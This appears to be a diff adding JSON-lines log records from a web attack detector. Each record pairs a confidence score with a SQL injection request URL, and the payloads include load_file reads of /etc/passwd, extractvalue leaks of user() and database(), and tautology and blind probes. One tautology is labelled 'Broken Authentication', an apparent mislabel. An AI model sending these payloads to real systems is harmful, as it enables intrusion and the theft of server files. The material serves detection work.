+{"time": "2025-11-28T14:00:24Z", "ip": "10.6.0.24", "attack": "SQL Injection", "score": 99.96, "url": "/sys?id='%20UNION%20SELECT%20@@version_compile_os,NULL--", "body": ""}
+{"time": "2025-11-28T14:00:25Z", "ip": "10.6.0.25", "attack": "SQL Injection", "score": 99.55, "url": "/read?id=1'%20UNION%20SELECT%20load_file('/etc/passwd'),NULL--", "body": ""}
+{"time": "2025-11-28T14:00:26Z", "ip": "10.6.0.26", "attack": "SQL Injection", "score": 99.74, "url": "/read?id=1'%20UNION%20SELECT%20load_file('/etc/hosts'),NULL--", "body": ""}
+{"time": "2025-11-28T14:00:27Z", "ip": "10.6.0.27", "attack": "SQL Injection", "score": 98.7, "url": "/js?id='%20OR%20JSON_EXTRACT('{\"u\":1}','$.u')=1", "body": ""}
+{"time": "2025-11-28T14:00:28Z", "ip": "10.6.0.28", "attack": "SQL Injection", "score": 97.35, "url": "/js?id='%20OR%20JSON_LENGTH('[1,2]')=2", "body": ""}
+{"time": "2025-11-28T14:00:29Z", "ip": "10.6.0.29", "attack": "SQL Injection", "score": 99.86, "url": "/nested?id='%20OR%20(SELECT%20(SELECT%201))=1", "body": ""}
+{"time": "2025-11-28T14:00:30Z", "ip": "10.6.0.30", "attack": "SQL Injection", "score": 99.9, "url": "/nested?id='%20OR%20(SELECT%20(SELECT%20user()))%20LIKE%20'%25'", "body": ""}
+{"time": "2025-11-28T14:00:31Z", "ip": "10.6.0.31", "attack": "SQL Injection", "score": 96.56, "url": "/ascii?id='%20AND%20ASCII('A')>60", "body": ""}
+{"time": "2025-11-28T14:00:32Z", "ip": "10.6.0.32", "attack": "SQL Injection", "score": 99.58, "url": "/ascii?id='%20AND%20ASCII('z')<200", "body": ""}
+{"time": "2025-11-28T14:00:33Z", "ip": "10.6.0.33", "attack": "SQL Injection", "score": 99.1, "url": "/extract?id='%20OR%20extractvalue(1,concat(0x5c,(SELECT%20user())))", "body": ""}
+{"time": "2025-11-28T14:00:34Z", "ip": "10.6.0.34", "attack": "SQL Injection", "score": 99.23, "url": "/extract?id='%20OR%20extractvalue(1,concat(0x5c,(SELECT%20database())))", "body": ""}
+{"time": "2025-11-28T14:00:35Z", "ip": "10.6.0.35", "attack": "SQL Injection", "score": 93.82, "url": "/panel?id=1'%20OR%20'1'='1'--", "body": ""}
+{"time": "2025-11-28T14:00:36Z", "ip": "10.6.0.36", "attack": "Broken Authentication", "score": 51.31, "url": "/panel?id=1\"%20OR%20\"1\"=\"1\"--", "body": ""}
+{"time": "2025-11-28T14:00:37Z", "ip": "10.6.0.37", "attack": "SQL Injection", "score": 66.87, "url": "/panel?id=1%20OR%20'1'%3D'1'%23", "body": ""}
+{"time": "2025-11-28T14:00:38Z", "ip": "10.6.0.38", "attack": "SQL Injection", "score": 99.78, "url": "/panel?id=1'%20OR%20(SELECT%20LENGTH('admin'))=5", "body": ""}
+{"time": "2025-11-28T14:00:39Z", "ip": "10.6.0.39", "attack": "SQL Injection", "score": 99.34, "url": "/test?id='%20OR%20(SELECT%20SUBSTR('abc',1,1))='a'", "body": ""}
+{"time": "2025-11-28T14:00:40Z", "ip": "10.6.0.40", "attack": "SQL Injection", "score": 99.34, "url": "/test?id='%20OR%20(SELECT%20ASCII('A'))=65", "body": ""}
+{"time": "2025-11-28T14:00:41Z", "ip": "10.6.0.41", "attack": "SQL Injection", "score": 99.51, "url": "/complex?id='%20OR%20((1=1)%20AND%20(2=2))", "body": ""}
+{"time": "2025-11-28T14:00:42Z", "ip": "10.6.0.42", "attack": "SQL Injection", "score": 99.46, "url": "/complex?id='%20OR%20((3>1)%20AND%20(4>2))", "body": ""}
